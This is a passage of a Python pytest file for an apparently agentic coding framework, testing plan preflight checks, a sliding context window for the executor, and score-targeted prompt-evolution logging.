            {"step_number": i, "tool": "code", "params": {"path": f"f{i}.ts"}, "description": f"Write file {i}", "depends_on": []}
            for i in range(1, 5)
        ]}
        result = preflight_check(plan)
        assert any(i.category == "completeness" for i in result.issues)

    def test_cost_blocker_for_huge_plan(self):
        from hands.plan_preflight import preflight_check
        plan = {"steps": [
            {"step_number": i, "tool": "code", "params": {}, "depends_on": []}
            for i in range(1, 200)
        ]}
        result = preflight_check(plan, cost_ceiling=0.10)
        assert any(i.category == "cost" and i.severity == "blocker" for i in result.issues)

    def test_preflight_result_format(self):
        from hands.plan_preflight import PreflightResult, PreflightIssue
        r = PreflightResult(issues=[
            PreflightIssue("blocker", "cost", "Too expensive"),
            PreflightIssue("warning", "ordering", "Config late"),
        ])
        text = r.format()
        assert "BLOCKER" in text
        assert "WARNING" in text

    def test_passed_property(self):
        from hands.plan_preflight import PreflightResult, PreflightIssue
        r1 = PreflightResult(issues=[PreflightIssue("warning", "x", "minor")])
        assert r1.passed  # Warnings don't block

        r2 = PreflightResult(issues=[PreflightIssue("blocker", "x", "fatal")])
        assert not r2.passed


# ==========================
# v12 — Sliding Context Window Tests
# ==========================

class TestSlidingContextWindow:
    """Tests for executor sliding context window."""

    def test_build_state_accumulator_empty(self):
        from hands.executor import _build_state_accumulator
        assert _build_state_accumulator([], []) == ""

    def test_build_state_accumulator_success(self):
        from hands.executor import _build_state_accumulator
        results = [
            {"step": 1, "tool": "code", "success": True, "output": "Created file.ts", "error": ""},
            {"step": 2, "tool": "terminal", "success": True, "output": "Tests passed", "error": ""},
        ]
        state = _build_state_accumulator(results, ["file.ts"])
        assert "2 step(s) completed" in state
        assert "Step 1 [code] ✓" in state
        assert "Step 2 [terminal] ✓" in state
        assert "file.ts" in state

    def test_build_state_accumulator_with_failure(self):
        from hands.executor import _build_state_accumulator
        results = [
            {"step": 1, "tool": "code", "success": True, "output": "ok", "error": ""},
            {"step": 2, "tool": "terminal", "success": False, "output": "", "error": "Command failed"},
        ]
        state = _build_state_accumulator(results, [])
        assert "✗" in state
        assert "Command failed" in state

    def test_apply_sliding_window_short_conversation(self):
        from hands.executor import _apply_sliding_window
        conv = [
            {"role": "user", "content": "Plan..."},
            {"role": "assistant", "content": "Ok"},
            {"role": "user", "content": "Result..."},
        ]
        result = _apply_sliding_window(conv, [], [])
        assert result == conv  # Unchanged — too short

    def test_apply_sliding_window_compresses(self):
        from hands.executor import _apply_sliding_window, SLIDING_WINDOW_KEEP_RECENT
        # Build a conversation longer than SLIDING_WINDOW_KEEP_RECENT + 1
        conv = [{"role": "user", "content": "Plan..."}]
        for i in range(10):
            conv.append({"role": "assistant", "content": f"Assistant msg {i}" * 100})
            conv.append({"role": "user", "content": f"TOOL RESULT {i}" * 100})

        step_results = [{"step": i + 1, "tool": "code", "success": True, "output": "ok", "error": ""} for i in range(10)]
        compressed = _apply_sliding_window(conv, step_results, ["file.ts"])

        # Should be much shorter than original
        assert len(compressed) < len(conv)
        # Should keep plan msg and recent messages
        assert compressed[0]["content"] == "Plan..."
        # State accumulator should be present
        state_content = " ".join(m["content"] for m in compressed)
        assert "EXECUTION STATE" in state_content

    def test_sliding_window_preserves_recent(self):
        from hands.executor import _apply_sliding_window, SLIDING_WINDOW_KEEP_RECENT
        conv = [{"role": "user", "content": "Plan..."}]
        for i in range(8):
            conv.append({"role": "assistant", "content": f"A{i}"})
            conv.append({"role": "user", "content": f"U{i}"})

        compressed = _apply_sliding_window(conv, [], [])
        # Last messages should be preserved
        last_msgs = [m["content"] for m in compressed[-SLIDING_WINDOW_KEEP_RECENT:]]
        orig_last_msgs = [m["content"] for m in conv[-SLIDING_WINDOW_KEEP_RECENT:]]
        assert last_msgs == orig_last_msgs


# ==========================
# v12 — Targeted Dimension Evolution Tests
# ==========================

class TestTargetedEvolution:
    """Tests for exec_meta targeted dimension evolution."""

    def test_identify_weakest_dimension(self):
        from hands.exec_meta import _identify_weakest_dimension
        outputs = [
            {"validation": {"scores": {"correctness": 8, "completeness": 5, "code_quality": 7, "security": 6}}},
            {"validation": {"scores": {"correctness": 9, "completeness": 4, "code_quality": 8, "security": 7}}},
            {"validation": {"scores": {"correctness": 7, "completeness": 5, "code_quality": 7, "security": 6}}},
        ]
        result = _identify_weakest_dimension(outputs)
        assert result == "completeness"

    def test_identify_weakest_uniform_returns_none(self):
        from hands.exec_meta import _identify_weakest_dimension
        outputs = [
            {"validation": {"scores": {"correctness": 7, "completeness": 7, "code_quality": 7}}},
            {"validation": {"scores": {"correctness": 7, "completeness": 7, "code_quality": 7}}},
        ]
        result = _identify_weakest_dimension(outputs)
        assert result is None  # Gap < 0.5

    def test_identify_weakest_no_scores(self):
        from hands.exec_meta import _identify_weakest_dimension
        outputs = [{"validation": {}}, {"validation": {"scores": {}}}]
        result = _identify_weakest_dimension(outputs)
        assert result is None

    def test_build_targeted_prompt(self):
        from hands.exec_meta import _build_targeted_evolution_prompt
        prompt = _build_targeted_evolution_prompt("code_quality")
        assert "code_quality" in prompt
        assert "TARGETED" in prompt
        assert "ONE specific dimension" in prompt

    def test_evaluate_last_evolution_no_log(self, tmp_path=None):
        from hands.exec_meta import _evaluate_last_evolution
        result = _evaluate_last_evolution("nonexistent_domain_xyz_test", [])
        assert result is None

    def test_evaluate_last_evolution_with_data(self):
        import tempfile
        from hands.exec_meta import _evaluate_last_evolution, _save_exec_evolution_entry, _evolution_log_path
        domain = "_test_targeted_eval"
        path = _evolution_log_path(domain)

        try:
            # Create a log entry
            _save_exec_evolution_entry(domain, {
                "version": "v001",
                "previous_version": "default",
                "date": "2025-01-01",
                "changes": ["improved security"],
                "reasoning": "test",
                "target_dimension": "security",
                "outcome": "pending",
            })

            # Create outputs—before and after
            outputs = [
                {"timestamp": "2024-12-28T00:00:00", "validation": {"scores": {"security": 5}}},
                {"timestamp": "2024-12-29T00:00:00", "validation": {"scores": {"security": 4}}},
                {"timestamp": "2025-01-02T00:00:00", "validation": {"scores": {"security": 7}}},
                {"timestamp": "2025-01-03T00:00:00", "validation": {"scores": {"security": 8}}},
            ]

            result = _evaluate_last_evolution(domain, outputs)
            assert result is not None
            assert result["status"] == "evaluated"
            assert result["improved"] is True
            assert result["delta"] > 0
        finally:
            # Cleanup
            if os.path.exists(path):
                os.remove(path)
            import shutil
            parent = os.path.dirname(path)
            if os.path.isdir(parent) and os.path.basename(parent) == domain:
                shutil.rmtree(parent, ignore_errors=True)

    def test_evaluate_last_evolution_insufficient_data(self):
        from hands.exec_meta import _evaluate_last_evolution, _save_exec_evolution_entry, _evolution_log_path
        domain = "_test_targeted_insuff"
        path = _evolution_log_path(domain)

        try:
            _save_exec_evolution_entry(domain, {
                "version": "v001",
                "date": "2025-01-01",
                "target_dimension": "security",
                "outcome": "pending",
            })

            # Only 1 output after evolution — not enough
            outputs = [
                {"timestamp": "2025-01-02T00:00:00", "validation": {"scores": {"security": 7}}},
            ]

            result = _evaluate_last_evolution(domain, outputs)
            assert result is not None
            assert result["status"] == "insufficient_data"
        finally:
            if os.path.exists(path):
                os.remove(path)
            import shutil
            parent = os.path.dirname(path)
            if os.path.isdir(parent) and os.path.basename(parent) == domain:
                shutil.rmtree(parent, ignore_errors=True)

    def test_evolution_log_stores_target_dimension(self):
        from hands.exec_meta import _save_exec_evolution_entry, load_exec_evolution_log, _evolution_log_path
        domain = "_test_targeted_log"
        path = _evolution_log_path(domain)

        try:
            _save_exec_evolution_entry(domain, {
                "version": "v001",
                "target_dimension": "code_quality",
                "targeted": True,
                "outcome": "pending",
            })
            log = load_exec_evolution_log(domain)
            assert len(log) == 1
            assert log[0]["target_dimension"] == "code_quality"
            assert log[0]["targeted"] is True
        finally:
            if os.path.exists(path):
                os.remove(path)
            import shutil
            parent = os.path.dirname(path)
            if os.path.isdir(parent) and os.path.basename(parent) == domain:
                shutil.rmtree(parent, ignore_errors=True)


